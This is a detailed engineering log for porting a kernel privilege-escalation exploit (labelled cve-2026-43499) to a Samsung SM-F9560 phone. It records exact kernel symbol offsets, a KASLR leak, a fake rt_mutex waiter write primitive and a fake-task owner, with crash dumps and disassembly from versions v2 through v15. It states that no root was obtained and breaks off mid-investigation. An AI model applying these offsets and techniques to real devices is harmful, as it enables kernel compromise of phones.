# SM-F9560 / F9560ZCU3DZDP porting record

Status: **hardware test attempted; not usable yet; second profile rebooted the device**.

## Firmware identity

| Field | Verified value |
| --- | --- |
| Package model | `SM-F9560` |
| AP/PDA | `F9560ZCU3DZDP` |
| Device codename | `q6q` (system name `q6qzcx`) |
| Android build | `BP4A.251205.006` / Android 16 |
| Build fingerprint | `samsung/q6qzcx/q6q:16/BP4A.251205.006/F9560ZCU3DZDP:user/release-keys` |
| Kernel release | `6.1.145-android14-11-3254009-abF9560ZCU3DZDP` |
| ABI | `arm64-v8a` |
| SDK | `36` |

## Provenance

| Object | Size | SHA-256 |
| --- | ---: | --- |
| AP archive | 16,991,303,803 | `ffc9d2bee509d79b91a5e2b1eef1545d6374fbcd4ef0a448646bb947fc17691b` |
| `boot.img.lz4` | 22,110,581 | `b3ac58d765b297b2cef5d6ab9f0118b2f12fb11b0a0b912136b22cc5b82d7e2e` |
| decompressed `boot.img` | 100,663,296 | `570f623cd6f021f3085c7939d988c86b9ed8ca7a6a9ad7d199a1825c3614ef3a` |
| raw kernel payload | 38,005,248 | `1d67dfb0b0fda5877da1b40ad5bc2ae55b1d5bfb8aced20c2af2c8aa02f3541f` |
| recovered `vmlinux.elf` | 43,072,392 | `37be943fe3122a8c75d7811d411027eb08d523064a9387c2b4f5d4fe31977b7c` |
| raw BTF | 5,982,786 | `9b26dd8cf87273da0141b42d93f30a732cef9f9660550a17eb1eddfaab5f3db2` |
| matching `abl.elf` | 2,441,528 | `37fe38913468b5b0ecaf68de2b1fa1087453adc5014960b68dd6a2bad0d78e05` |

The kernel payload is extracted from `boot.img` at offset `0x1000` using the
`kernel_size` field at `0x08`. The raw BTF interval is
`[0x180b384, 0x1dbfdc6)` and passed the complete-header, bounds, and
string-section checks.

## Exact symbol and BTF results

The recovered ELF base is `0xffffffc008000000`. Required symbols match the
compact Android 6.1 layout used by the sibling Qualcomm profile, except
`kmalloc_caches`, which is target-specific at `0x0176cbb8`. The generated
profile is `src/targets/q6q-F9560ZCU3DZDP/`.

| Use | Offset |
| --- | ---: |
| `call_usermodehelper_exec_work` | `0x000d39cc` |
| `noop_llseek` | `0x003a14e4` |
| `generic_file_splice_read` | `0x003ef340` |
| `configfs_read_iter` | `0x004712a4` |
| `configfs_bin_write_iter` | `0x004717d4` |
| ashmem ioctl/compat/mmap/open/release/fdinfo | `0x00d3a314` / `0x00d3ac4c` / `0x00d3aca4` / `0x00d3aed0` / `0x00d3af58` / `0x00d3b078` |
| `anon_pipe_buf_ops` | `0x01219d90` |
| `ashmem_fops` | `0x013d1140` |
| `kmalloc_caches` | `0x0176cbb8` |
| `system_unbound_wq` | `0x0223ae60` |
| `nfulnl_logger` object | `0x02242a20` |
| `nfnetlink_log` name target | `0x016a6574` |
| `init_task` | `0x0224f8c0` |
| `ashmem_miscs + 0x10` | `0x023bb5b0` |
| random-table `boot_id` data pointer slot | `0x023762f0` |
| `root_task_group` | `0x0244cd80` |
| `selinux_state.enforcing` | `0x02521588` |
| `sysctl_bootid` | `0x026046e8` |

BTF confirms `struct file_operations` size `0x110`, compact
`rt_mutex_waiter` size `0x58`, task offsets
`usage=0x40`, `prio=0x84`, `normal_prio=0x8c`,
`sched_task_group=0x348`, `pi_lock=0x924`, `pi_waiters=0x938`,
`pi_top_task=0x948`, `pi_blocked_on=0x950`, and `struct page` size
`0x40` with `compound_head=0x08`, `slab_cache=0x18`, and
`page_type=0x30`.

`worker_thread` contains the blocking `bl schedule` at `0x000db19c`;
the trace caller return is `SLIDE_TRACEFS_WORKER_CALLER_OFF=0x000db1a0`.
The ftrace registration calculation gives event ID `106`, and the generated
P0 table contains all 256 source qwords read back from the raw kernel.

## ABL physical-load proof

The matching BL contains the Qualcomm `LinuxLoader` PE (`LinuxLoader.pe`). Its
ARM64 handoff path is target-specific and independently disassembled:

- `LinuxLoader` detects the ARM64 Image magic `ARMd` at RVA `0x17590` and
  selects the `0x80000` load offset at RVA `0x176cc`.
- The matching `vendor_boot.img` contains 22 DTBs. The selected Qualcomm DTB
  has `reserved-memory/gunyah_hyp_region@80000000` with
  `reg = <0 0x80000000 0 0x00e00000>`, fixing the lowest RAM base used by the
  loader at `0x80000000`.
- The raw Image header has `text_offset = 0`; therefore
  `P0_PHYS_OFFSET = 0x80000000` and `P0_KERNEL_PHYS_LOAD = 0x80080000`.

## pselect stack proof

This kernel's `__arm64_sys_pselect6` subtracts `0x90` bytes before calling
`core_sys_select`. The target `core_sys_select` subtracts `0x1c0` and uses its
stack fd-set storage at `sp + 0x50`, i.e. `E - 0x200` from the pselect entry
stack pointer `E`. The compact `rt_mutex_waiter` path in the target's
`futex_wait_requeue_pi` leaves the stale waiter at `E - 0x1e8`; the difference
is three qwords. Thus `SLIDE_PSELECT_WORD_SHIFT=3` is independently retained
for this target.

## Remaining gates

- The target export CRC input is recovered as
  `firmware_extracted/kernel_payload/Module.symvers` (8,283 symbols), but an
  exact-vermagic KernelSU late-load pair has not been built. The available E3Q
  module is for `...33419968-abS928USQS6DZF2`, while this kernel requires
  `...3254009-abF9560ZCU3DZDP`; it must not be reused.
- The app payload builds and passes offline syntax/size checks. It was then
  executed on the connected matching F9560 (`<serial-elided>`) as a real test:
  all 24 attempts failed before the P0 physical write window, so no root was
  obtained. The device remained on the same boot ID, `uid=2000 (shell)`, and
  enforcing SELinux. The pulled evidence is
  `firmware_extracted/device_logs/f9560-run.log`.
- The log does show the target profile and pselect route reaching
  `sched_ok=1`, but `p0 physical write status=256 ok=0`; this is a
  diagnostic milestone, not a successful exploit.
- The second profile corrected the BTF-derived `mm_struct`/SLUB stride and
  reached the physical gate on hardware (`write_window=1`, `p0 physical write
  status=0`, `p0 gate hits=1`). It then rebooted the device during the next
  physical route before KASLR/FOPS/root completion. After recovery the boot ID
  changed, but verified boot stayed green, SELinux stayed enforcing, and the
  shell remained `uid=2000`; no persistent root or KernelSU state was observed.

- Read-only post-reboot checks confirmed `CONFIG_ARM64_MTE=y` and
  `CONFIG_KASAN_HW_TAGS=y` in `/proc/config.gz`. The second profile had not
  enabled the target's MTE-aware KernelSnitch path. Offline review also found
  that the current q6q P0 table stores direct Image source offsets in each row;
  the runtime therefore needs `APP_P0_FINGERPRINT_INVERSE_SLIDE=1` to recover
  the actual slide from the probe offset.
- A third profile was built locally with those two corrections and the existing
  q6q BTF/physical-load settings. It has not been run on the phone after the
  reboot. The artifacts are under
  `build/q6q-F9560ZCU3DZDP-v3/`: app debug 139,128 bytes
  (`D7CFDEE4778A300B60C854AF02D17D6EE638CA0DAB141378F346F29CE41F5E2A`),
  fixed-size app release 104,128 bytes
  (`C52367040E56D61FE2B5B456251253E479B9B02B3DE8AE0FC7FE3B371CE28CF3`),
  and root helper 26,072 bytes
  (`F609373B905ED4E2C46D18A3981E82E313153E5B6ABBD6D5DAEF85FA05C348C9`).
  These pass local AArch64 ELF and size checks only; the device is not yet
  confirmed usable.

- A further offline audit of the v2 log found the leaked `mm_struct` at
  `object_index=12`; the q6q header had no object-index or exact-partition
  bounds, so that candidate was accepted. The fourth profile adds the same
  SLUB safety bounds used by the validated MTE profiles (`slide=27..30`,
  `fops>=24`, identity end `0xffffff8080000000`, exact partition enabled).
  Its direct-source P0 table was independently checked against all 256 qwords
  in `boot.Image`; the inverse-runtime mapping is explicit in the target.
- The fourth profile is locally built under
  `build/q6q-F9560ZCU3DZDP-v4/`: app debug 140,200 bytes
  (`31BEB7B7A845EC5377B1DD4B07833E71360DD8893F122E29D6356400A3157A20`),
  fixed-size app release 104,128 bytes
  (`2C1EBE0B45443368A3161A234990B20818BD1A40C2C28904A224A3374A405E9C`),
  and root helper 26,072 bytes
  (`F609373B905ED4E2C46D18A3981E82E313153E5B6ABBD6D5DAEF85FA05C348C9`).
  It remains untested on hardware.

## v5-v7 regression and v8 root-cause fix

The v5-v7 profiles never leaked `mm_struct` on hardware:

| Run | Change | Result on device |
| --- | --- | --- |
| v4 | MTE-aware, exact partition + bounds | `pipe KernelSnitch sk_buff page leak failed` |
| v5 | MTE off | same pipe-leak failure |
| v7 | futex hash `0x1000` -> `0x800` | pipe oracle OK, but `KernelSnitch mm_struct leak failed` on every retry |

`futex_hashsize = roundup_pow_of_two(256 * num_possible_cpus())`; the live q6q
`/sys/devices/system/cpu/possible` is `0-7`, so the kernel table is `0x800`.
The `0x1000` user-space value used by v4/v5 mismatched and broke the collision
detection; v7's `0x800` fixed the pipe (sk_buff page) leak.

The remaining mm_struct leak failure is the search bounds. v4-v7 copied the
e1s/e2s `APP_KERNEL_PAGE_KSNITCH_IDENTITY_END 0xffffff8080000000` +
`slide=27..30` values AND additionally defined
`APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION`, which activates
`kernelsnitch_set_search_bounds()`. On e1s/e2s that call is compiled out (those
headers never define `APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION`), so the
device-tested profiles actually search the default 64 GiB identity window with
all 32 object indices - and the e2s first MTE-aware run found `mm_struct` at
`ffffff8c66b2a1c0`, far beyond the 2 GiB window v4-v7 restricted q6q to.

q6q's own evidence agrees: the v2 run (no object-index or exact-partition
bounds) found `mm_struct` at `object_index=12` and reached the physical gate
(`write_window=1`, `p0 physical write status=0`, `p0 gate hits=1`), while
v4-v7 with the tightened bounds fail deterministically. The q6q linear map is
randomized (`CONFIG_RANDOMIZE_MEMORY`), so the leak child's `mm_struct` can sit
at any offset of the direct-map window depending on the per-boot seed.

### v8 profile

`src/targets/q6q-F9560ZCU3DZDP-v8/` = v7 (futex hash `0x800`, MTE off,
direct-source P0 table with inverse slide) with the v2 search configuration
restored:

- `APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION` / `IDENTITY_END` undefined, so
  `kernelsnitch_set_search_bounds()` is compiled out and the default
  `[KERNELSNITCH_IDENTITY_START, KERNELSNITCH_IDENTITY_END]` =
  `[0xffffff8000000000, 0xffffff9000000000]` window with object indices 0..31
  is used (verified via `clang -dM -E`);
- `APP_SLIDE_MIN/MAX_OBJECT_INDEX`, `APP_FOPS_MIN_OBJECT_INDEX` and
  `APP_RECLAIM_MAX_DIRECT_BASE` undefined, so a leaked candidate is accepted
  without index or base rejection, exactly like v2.

Built with NDK r27c (`aarch64-linux-android35-clang`):

```text
build/q6q-F9560ZCU3DZDP-v8/cve-2026-43499-app.so   138,776 bytes
  SHA-256 E97B529EF1BDEDC09792E01968D37DA8999F80E0A39F63D6E289B46014F6CE49
build/q6q-F9560ZCU3DZDP-v8/cve-2026-43499-root     26,072 bytes
```

ELF64 little-endian AArch64 `DYN`, label
`q6q-F9560ZCU3DZDP-app-production-v8-unbounded-search`. Hardware result is
recorded below when available.

## v8 hardware result and the probe-carveout root cause

v8 ran on the matching F9560 (`<serial-elided>`) and passed the mm leak
(`mm leaked=ffffff882be49800 base=ffffff882be48000 object_index=6`), the
sk_buff reclaim, the P0 gate write (`p0 physical write status=0 ok=1`,
`p0 pipe gate hits=1 changed=0`), and `sched_ok=1 write_window=1`. It then
panicked at the probe-slot trigger. The Samsung kernel-panic dump
(`/data/log/dumpstate_lastkmsg_7_..._KP.log.gz`) shows:

```text
[1255.443630] Unable to handle kernel paging request at virtual address ffffff8000270000
[1255.445876] pc : __arch_copy_to_user+0x180/0x238
[1255.445884] lr : copyout+0x90/0x114
Call trace: __arch_copy_to_user <- _copy_to_iter <- copy_page_to_iter <- pipe_read <- vfs_read
FSC = 0x06: level 2 translation fault; [ffffff8000270000] pgd=... pmd=0000000000000000
x1 = ffffff8000270000 (copy source), x22 = fffffffe00009c00 (forged struct page)
PHYS_OFFSET: 0x80000000
```

The probe slot forges a pipe read at
`P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + P0_ORACLE_PROBE_OFFSET` =
`PAGE_OFFSET + 0x80000 + 0x1f0000` = `0xffffff8000270000` = phys
`0x80270000` = kernel-Image offset `0x1f0000`. That phys is inside the
`gunyah_hyp_region [0x80000000, 0x80e00000)` reserved region, which the kernel
excludes from the linear map, so the forged pipe read faults and panics. The
kernel Image is loaded at `0x80080000`; its first `0xd80000` bytes overlap the
carveout and can never be read via the linear alias. The v7 crash dump
(`dumpstate_lastkmsg_6`) shows the byte-identical fault, and the v2 crash
(`dumpstate_lastkmsg_5`) is the same probe fault.

Live `/proc/config.gz` confirms the layout is fixed
(`CONFIG_RANDOMIZE_MEMORY` is not set; `CONFIG_ARM64_VA_BITS=39`;
`CONFIG_RANDOMIZE_BASE=y` for the image KASLR only), so the S25U-style fix
applies: move the probe window above the carveout. (The S25U loads at
`0xa8000000`, already above the carveout, which is why its probe works; the
Exynos devices have no gunyah carveout at all.)

### v9 profile

`src/targets/q6q-F9560ZCU3DZDP-v9/` = v8 with:

- `P0_ORACLE_PROBE_OFFSET 0x1f0000 -> 0x1000000`: the probe reads Image
  offset `0x1000000` (phys `0x81080000` > `0x80e00000`);
- regenerated `p0_fingerprint.h` in the q6q direct-source-offset convention
  (row key = Image source offset, key range `[0xe10000, 0x1000000]`), keeping
  the inverse-slide formula `slide = P0_ORACLE_PROBE_OFFSET - matched_key`
  within `[0, 0x1f0000]`. The generator was verified by reproducing the v5
  table byte-for-byte at probe `0x1f0000` before regenerating.

Built with NDK r27c:

```text
build/q6q-F9560ZCU3DZDP-v9/cve-2026-43499-app.so   138,776 bytes
  SHA-256 A1E557C1E9969F03244161C8188A63701698C6E61ED8AA007CB7B6C31855085D
build/q6q-F9560ZCU3DZDP-v9/cve-2026-43499-root     26,072 bytes
```

Label `q6q-F9560ZCU3DZDP-app-production-v9-probe-above-carveout`.

## v9 hardware result: the linear map does not subtract memstart

v9 moved the probe to phys `0x81080000` and crashed with the byte-identical
pipe_read fault at the new address
(`[2017.079217] Unable to handle kernel paging request at virtual address
ffffff8001080000`, `x22 = fffffffe00042000`, `x1 = ffffff8001080000`), so the
whole low region is unmapped - the carveout is not the only issue.

Three independent facts then pinned the q6q memory model:

1. `/proc/zoneinfo` (live device): `Node 0, zone Normal`, `start_pfn 530144`
   -> RAM starts at phys `0x81720000`, `spanned 11004192` pages (~42 GB of
   address space) with `present ~2.9M` pages (~11 GB usable; MemTotal
   11381264 kB). The range below `0x81720000` is the
   gunyah_hyp_region + cpusys_vm_region + tags_region + xbl + aop + tme +
   smem reserved cascade (all listed in the vendor_boot DTBs, parsed at
   `K:\Fold6\q6q-dtb-reserved.txt`) and has no linear-map PTEs.
2. The v9 crash register math: the forged struct page
   `x22 = 0xfffffffe00042000` has `page_to_phys = 0x1080000`, and the
   faulting copy source `x1 = 0xffffff8001080000 = PAGE_OFFSET + 0x1080000`,
   i.e. `__va(phys) = PAGE_OFFSET + phys` with **memstart = 0** for the VA
   math (the dump's printed `PHYS_OFFSET: 0x80000000` is the RAM base, not
   memstart_addr).
3. The leaked mm_struct (+40.4 GB) and pipe pages (+38.7 GB) are therefore
   real: phys 40.4 GB / 38.7 GB are inside the zone span - the v8/v9 leaks
   and the working gate are consistent with this model.

The payload's alias math subtracts `P0_PHYS_OFFSET` (`p0_data_alias`,
`P0_DATA_ALIAS_CONST`), placing every image alias 2 GB below its real VA.
This is why the v8/v9 probes faulted: their computed aliases land below
`0x81720000` regardless of the probe offset.

### v10 profile

`src/targets/q6q-F9560ZCU3DZDP-v10/` = v9 with:

- `P0_PHYS_OFFSET 0x80000000 -> 0`: `P0_KERNEL_PHYS_DELTA` becomes
  `P0_KERNEL_PHYS_LOAD = 0x80080000`, so `P0_DATA_ALIAS_CONST` /
  `p0_data_alias` yield `PAGE_OFFSET + phys` - the kernel's real mapping.
  The direct-map math (`direct_to_page`/`page_to_direct` with
  `DIRECT_MAP_BASE = PAGE_OFFSET`) was already correct.
- `P0_ORACLE_PROBE_OFFSET 0x1000000 -> 0x2400000`: probe phys
  `0x80080000 + 0x2400000 = 0x82480000`, inside mapped zone RAM
  (`>= 0x81720000`) and `0x20000` below the pvm_fw reserved region
  (`0x824a0000`). The fingerprint table was regenerated for key range
  `[0x2210000, 0x2400000]`.

```text
build/q6q-F9560ZCU3DZDP-v10/cve-2026-43499-app.so   138,792 bytes
build/q6q-F9560ZCU3DZDP-v10/cve-2026-43499-root     26,072 bytes
```

Label `q6q-F9560ZCU3DZDP-app-production-v10-memstart0-zone-probe`.

Note for the later stages: with memstart = 0, linear reads of image symbols
below offset `0x16a0000` (phys `< 0x81720000`, e.g. `ashmem_fops` at
`0x13d1140`) are unmapped; those must go through the virtual image mapping
(`text_addr`/`canon_addr`). Symbols at or above `0x16a0000` (e.g.
`kmalloc_caches` at `0x176cbb8`, `ashmem_misc` at `0x23bb5b0`) are linearly
readable.

### v10 hardware results

First v10 run (boot `db57a8d2`, 01:41): **no kernel fault anywhere** - the
alias correction works. Every one of the 8 fresh-page attempts leaked
`mm_struct` cleanly (object indices 17, 5, 3, ...), completed the sk_buff
reclaim and the gate write (`p0 physical write status=0 ok=1`), but the gate
marker never landed in the pipe oracle (`p0 pipe gate hits=0 changed=0` on
all 8 attempts) and the run failed cleanly with `slide kaslr leak failed`
(`status=255`). The device stayed on the same boot, SELinux enforcing.

The gate marker path does not use `p0_data_alias` (the pipe forgery is
`direct_to_head_page`/`DIRECT_MAP_BASE` based), so the v10 alias changes
should not affect it; the misses look like the same stochastic
allocator-placement misses the e3q port documented (its 28/30/32-send spray
tuning). To be confirmed by re-runs (same-boot v10 re-run, and a v9 re-run
for comparison).

### Gate-miss root cause: boot-state dependent, not a v10 regression

Same-boot comparison: v10 run 2 missed 8/8 and the exact v9 binary (which
hit on attempt 1 on boot `e3fd1869`) also missed 8/8 on boot `db57a8d2`.
The reclaim choreography is identical to the validated e2s profile
(`APP_SLIDE_RECLAIM_SENDS 192`, `SNDBUF 16777216`, 2 late drain triggers),
so the gate hit rate is boot/allocator-state dependent.

### v10 fresh-boot run: PI-chain reached; rb_erase fault at the probe page

On a fresh boot (`985dcd9c`) the v10 run again missed the gate on attempts
1-5, but attempt 6's trigger reached the fake-waiter PI-chain and the kernel
panicked:

```text
[177.478257] Unable to handle kernel paging request at virtual address fffffffe02092010
PC is at rb_erase+0x94/0x2f8
LR is at rt_mutex_adjust_prio_chain+0x224/0x91c
```

`0xfffffffe02092010` = vmemmap struct page (pfn `0x82480`, phys
`0x82480000` - exactly the v10 probe page) `+ 0x10`. The PI-chain
(`rt_mutex_adjust_prio_chain`) engaged with the fake waiter and
`rb_erase` faulted while walking the waiter's rb-tree linkage at the probe
page's struct page. This is the same debugging stage the e2s record
describes for its attempt 6 (waiter tree geometry), so the next iteration
must correct the q6q fake-waiter tree geometry (parent/left/right linkage
and the rb-node offsets relative to the payload page and the probe struct
page). The full register dump for this fault was not captured by the
dumpstate (console section truncated); the ramdump binary should be pulled
for the complete context if needed.

### rb_erase fault decoded (offline, from the q6q ELF)

The q6q `vmlinux.elf` disassembly pins the fault exactly:

- `rb_erase+0x94` = `ldr x9, [x8, #0x10]!` - reading the PARENT node's
  `rb_left` after the re-link, where `x8 = node->__rb_parent_color & ~3`.
- The call site is `rt_mutex_adjust_prio_chain+0x220` (`bl rb_erase`, return
  `+0x224` = the reported LR), reached when `lock->owner != NULL` and
  `waiter->lock == lock`; the erased node is the fake waiter's tree entry.
- The fake parent = `direct_to_page(P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
  P0_ORACLE_PROBE_OFFSET)` = `direct_to_page(0xffffff8082480000)` = the
  vmemmap struct page of pfn `0x82480` (phys `0x82480000` = the v10 probe
  page). The fault address `0xfffffffe02092010` = that struct page `+ 0x10`.
- So the probe trigger's PI-chain DID engage (the gate hit on that attempt),
  and the kernel faulted reading the probe page's vmemmap struct page -
  while struct pages of the leaked mm/pipe pages (pfn `0x82c210` and up)
  read fine. On q6q the probe page's vmemmap entry is not readable
  (the `/sys/firmware/devicetree` properties that would give the exact
  bank/no-map layout are SELinux-denied for shell).

Implication for v11: the probe slot's rb-tree parent must be a struct page
the kernel can read (e.g. the gate-style `direct_to_page(base)` of the
leaked mm page, which the gate trigger already uses successfully), decoupled
from the forged-pipe oracle page (`p0_probe_page_struct`), whose
`page_to_virt` arithmetic does not itself read the struct page.

### Oracle data flow (derived)

`PIPE_OBJECT_SIZE = 0x800`; the probe slot's target is
`pipebuf_page_base + 0x800 + 0x28 = +0x828`. The write primitive is the
kernel's `rb_erase`: on the fake waiter's tree entry (`right == 0`,
`left == target`) it executes `str x9, [x10]` (writing the parent pointer
into the pipe page at `+0x828` - landing on a pipe-buffer entry's `.page`
field, so the subsequent pipe read returns `page_to_virt(parent)` = the
probe page's image content) and then `ldr x9, [x8, #0x10]!` (reading the
parent struct page - the kp9 fault). Both roles use the same parent, so the
parent must be a struct page the kernel can read AND the struct page of the
probe image page.

The kp9 fault proves the v10 probe page's struct page (pfn `0x82480`,
phys `0x82480000` - only `0x20000` below pvm_fw) is not kernel-readable,
while the leaked mm page's struct page (phys `0x82c210000`) is. The most
likely cause is a memory-bank boundary / hyp carveout edge at the top of
the image span; the zone core (zone start phys `0x816e0000`) should be
safe.

### v11 profile

`src/targets/q6q-F9560ZCU3DZDP-v11/` = v10 with the probe moved to image
offset `0x1e00000` (phys `0x81e80000`, inside the zone core and far from
pvm_fw); fingerprint table regenerated for key range
`[0x1c10000, 0x1e00000]`.

### Stale-waiter misalignment: the gate-miss root cause (kp10/kp11)

v11 fresh-boot run 2 panicked in attempt 2's GATE trigger:

```text
kp10: Unable to handle kernel NULL pointer dereference at virtual address 0000000000000000
      PC is at _raw_spin_trylock+0x1c/0xa4
kp11 (v12 shift-sweep, shift=2): same PC, fault 0000008200000000 (an
      untouched fd-set bitmask word)
```

`_raw_spin_trylock+0x1c` is the exact e2s-documented stale-waiter
misalignment fault (waiter->lock read from the wrong pselect fd-set word:
NULL / fd bits instead of `fake_lock`). Combined with the ~7% gate-hit rate,
the q6q pselect word geometry (`SLIDE_PSELECT_WORD_SHIFT 3`, derived
statically in the porting proof) is frequently misaligned at runtime - the
PI-chain silently aborts on most attempts (the gate misses) and faults on
the rest. The three gate hits ever seen (v8, v9, v10-run3) all used shift 3,
so the geometry is right only under favorable timing (the guard-pselect /
stale-waiter stack state varies).

v12 adds a diagnostic per-attempt shift sweep
(`APP_PSELECT_SHIFT_SWEEP`, order {3,2,4,1,5,0,6,7}); the first sweep run
crashed at shift 2 before reaching the other candidates, so the sweep order
must avoid known-crashing shifts or the geometry variance must be eliminated
first. The full register dumps for these faults are truncated in the
dumpstate captures; the ramdump partition should be pulled for the complete
stale-waiter context.

### Binary stale-waiter offset: S is 3 OR 6 (variance found)

Three crashes and three hits fit a single binary model: the kernel's stale
waiter sits at fd-set word offset S, which is 3 on some attempts and 6 on
others (delta = 3 qwords = the hrtimer_sleeper stack size - the timed vs
untimed `futex_wait_requeue_pi` frame depth):

| Run | payload shift | kernel S | lock word read | observed fault |
| --- | ---: | ---: | --- | --- |
| v8/v9/v10-run3 hits | 3 | 3 | 10 = fake_lock | (gate hit) |
| kp10 (v11) | 3 | 6 | 13 = ww_ctx = 0 | NULL deref |
| kp11 (v12 sweep) | 2 | 6 | 13 = raw fd bits | 0x8200000000 |
| kp12 (v12 sweep) | 6 | 3 | 10 = pi_right = 0 | NULL deref |

So the static `SLIDE_PSELECT_WORD_SHIFT 3` is correct only when S=3; the
gate misses/crashes are the S=6 attempts. A layout covering both positions
cannot naively overlap (the words 9-13 would need two different fields), so
the fix must first pin the S variance source (timed vs untimed futex frame,
or guard vs main pselect stack depth) and make both attempts take the same
frame, or place a full second waiter copy shifted to the S=6 position if
the layout overlap permits.

### Root cause: CONFIG_RANDOMIZE_KSTACK_OFFSET

`/proc/config.gz` has `CONFIG_RANDOMIZE_KSTACK_OFFSET=y` (with
`CONFIG_VMAP_STACK=y`, `CONFIG_STACKPROTECTOR_STRONG=y`). The q6q
`invoke_syscall` disassembly shows the per-syscall stack shift:

```text
cde4: adrp x9, 0xffffffc00a208000 <this_cpu_vector>   ; per-CPU slot base
cde8: add  x9, x9, #0x80                              ; kstack_offset slot
cdec: mrs  x8, TPIDR_EL1                              ; per-CPU base
cdf0: ldr  w8, [x8, x9]                               ; the offset value
cdf8: and  w8, w8, #0x3ff
cdfc: add  w8, w8, #0xf
ce00: and  x8, x8, #0x7f0                             ; round up to 16
ce04: sub  x8, x9, x8
ce08: mov  sp, x8                                     ; sp -= the shift
```

The shift is a 16-byte (2-qword) multiple of the per-CPU `kstack_offset`
value, so the stale waiter drifts in 2-qword steps: the re-derived S values
for the three crashes are 5 (kp10), 7 (kp11) and 3 (kp12) - the
`3 + 16-byte grid`. The validated devices (e2s etc.) do not have this
randomization (or it is disabled), which is why their fixed
`SLIDE_PSELECT_WORD_SHIFT 3` works deterministically.

The per-CPU slot is readable from userspace via the configfs primitive at
`KIMAGE_TEXT_BASE + slide + 0xa208080 + __per_cpu_offset[cpu]`, so the fix
is to read the offset at trigger time and place the fd-set words with the
corresponding corrected shift. Whether the offset evolves per syscall entry
(the upstream XOR write) still needs to be confirmed from the kernel
disassembly before the compensation can be exact.

### v13 diagnostic: kstack slot read fails in the SLIDE stage

The v13 build reads the cpu-0 slot (`kstack_offset` @ image offset
`0xa208080`, linear alias `0xffffff8082288080`) via the configfs primitive
before each gate trigger. Result: `read=0 value=0x0` - the primitive
returns zero bytes. The configfs read primitive has never been exercised on
q6q before (it belongs to the FOPS/root stage, which the port has not
reached), so either its ashmem/configfs field offsets need the q6q BTF
verification or the primitive requires a setup step the SLIDE stage skips.

### Decisive re-analysis: no runtime kstack randomization; S=3 is static

The four panic register dumps (kp10-kp13) and the exact q6q disassembly
overturn the randomization theory above. The runtime stack geometry is
fully deterministic:

- In all four panics the stale waiter (`task->pi_blocked_on`, x25) sits at
  offset `0x3c8` from the top of its 16 KiB vmap stack
  (`0xffffffc0XXXXXXXXc38`), and the consumer crash frame sits at `0x3d0`.
  The consumer's `0x3d0` equals exactly the static call-chain depth
  `0x150`(pt_regs) + `0x10`(sync_handler) + `0x20`(el0_svc) +
  `0x10`(do_el0_svc) + `0x30`(el0_svc_common) + `0x20`(invoke_syscall) +
  `0x80`(sched_setattr) + `0x90`(sched_setscheduler) + `0x50`(adjust_pi) +
  `0x80`(adjust_prio_chain) + `0x10`(trylock). Four independent boots with
  identical offsets rule out any per-boot or per-syscall sp shift.
- `invoke_syscall` contains three blocks: the normal entry (no slot
  access), a randomize block at `+0x74` (`sp -= round_up_16(slot & 0x3ff)`),
  and an XOR-evolve block at `+0x118`
  (`slot = (u16)get_random_u16() ^ ror32(slot, 5)`). Neither block has any
  branch target anywhere in the image; both sit behind the
  `kstack_offset_ready` jump-label nops (`nop` at `invoke_syscall+0x18` and
  `+0xe8`) and are simply not patched at runtime on this firmware, so the
  slot is never read, never evolved, and stays 0.
- With R=0 everywhere: waiter = `E - 0x1e8` (frames: `__arm64_sys_futex`
  `0x70` + `do_futex` `0x60` + `futex_wait_requeue_pi` `0x1b0`, `rt_waiter`
  local at `sp+0x98`) and fd-set base = `E - 0x200` (frames: pselect6
  `0x90` + `core_sys_select` `0x1c0`, `stack_fds` at `sp+0x50`), giving
  `S = 3` qwords deterministically.
- kp11's read `0x8200000000` is NOT raw fd bits: it is the forged
  wake-state+prio word (`FAKE_WAITER_PRIO = 130 = 0x82` shifted left 32,
  wake-state 0) at word `shift+8 = 10` for shift 2 - again S=3. kp12 and
  the v13 crash (shift 6) read word 10 = `pi_right = 0` - S=3. Only the
  fixed shift 3 places `fake_lock` at word 10, which the three v8/v9/v10
  gate hits used.
- The v13 configfs read=0 is expected: `configfs_read_once()` reads through
  the FOPS-stage fops hijack (`ashmem_fops -> configfs_read_iter`), which
  the SLIDE stage has not installed; before FOPS the pread reads the empty
  ashmem page. The offsets are not the issue.
- kp10 (v11, shift 3) remains a paradox: `rt_mutex_adjust_pi` read
  `next_lock = fake_lock` (x27 = leaked page + `0x4200`) from the same
  `[waiter+0x38]` that the chain's second read then saw as 0 (x24). The
  gate check `cmp x27, [x25+0x38]` forces both reads equal, so the word
  was concurrently zeroed between the two reads by an unidentified writer
  (no store to `waiter+0x38` exists anywhere in
  `rt_mutex_adjust_prio_chain`). Recorded as an open anomaly; the geometry
  itself (S=3, shift 3) is proven by x27.
- The ~7% gate-hit rate is therefore the sk_buff-reclaim/allocator
  choreography (the marker pipe slot only matches when the reclaimed page
  lands in the oracle pipe), the same stochastic behavior documented for
  the e3q port - not a pselect word-geometry variance.

### v14: fixed shift 3 (sweep and kstack diag removed)

`src/targets/q6q-F9560ZCU3DZDP-v14/` = v11 (zone-core probe `0x1e00000`)
with the v12 sweep and v13 diag removed; runtime shift is the static
`SLIDE_PSELECT_WORD_SHIFT 3` again. App 138,776 bytes, label
`q6q-F9560ZCU3DZDP-app-production-v14-fixed-shift3`.

### v14 hardware: geometry confirmed, gate-miss mechanism found

v14 run 1 (fresh boot) failed the first pipe sk_buff leak (ran at the
boot-quiet-window boundary; same-boot re-runs leak fine). v14 run 2:
8/8 clean gate misses, zero crashes - the fixed shift 3 is crash-free,
confirming the static S=3 geometry on hardware.

Disassembly of `rt_mutex_adjust_prio_chain` then pinned the gate-miss
mechanism: before the rb_erase marker write the chain runs a deadlock
gate

```text
0x1228e8: ldr x8, [x24, #0x18]   ; lock->owner
0x1228ec: ldr x9, [sp, #0x8]     ; caller frame slot (stale / irq-flags)
0x1228f0: and x8, x8, #~1
0x1228f4: cmp x8, x9
0x1228f8: b.eq -> -EDEADLK exit (unlock, ret=-35, NO marker write)
```

With `SLIDE_LOCK_OWNER_VALUE=1` the compare is `0 == residue`, so on most
boots the trigger exits -EDEADLK before the marker - the ~7% hit rate
(hits = boots where the caller-frame residue at `[sp+0x8]` was nonzero).
The post-marker path also shows `if (owner > 1) get_task_struct(owner &
~1)`, so the owner must be a safe fake-task pointer.

### v15: fake-task owner - new kp14 slab freelist crash (analysis in progress)

